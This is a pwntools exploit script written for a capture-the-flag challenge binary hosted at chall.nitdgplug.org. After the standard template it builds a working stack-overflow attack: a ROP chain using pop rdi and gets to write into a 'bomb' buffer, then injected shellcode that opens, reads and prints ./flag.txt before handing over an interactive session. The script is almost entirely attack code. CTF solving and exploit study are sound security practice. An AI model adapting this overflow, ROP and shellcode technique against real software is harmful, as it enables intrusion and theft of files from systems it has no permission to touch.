#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.nitdgplug.org --port 30104 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30104)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

bomb = exe.sym['bomb']
leave = 0x401355
pop_rdi = exe.search(asm('pop rdi ; ret')).next()
bss = exe.bss()


p = p64(bomb+24)
io.sendlineafter("something:\n",p)


p = 'a'*16
p += p64(bomb-8)
p += p64(pop_rdi)
p += p64(bomb)
p += p64(exe.plt['gets'])
p += p64(bomb)
# p += p64(leave)
io.sendlineafter("chance:\n",p)

# print len(p)
# print asm(p)

p = shellcraft.open("./flag.txt",0)
p += shellcraft.read(3, bss+0x300 ,100)
p += shellcraft.write(1, bss+0x300 ,100)
p = asm(p)

io.sendline(p)

io.interactive()
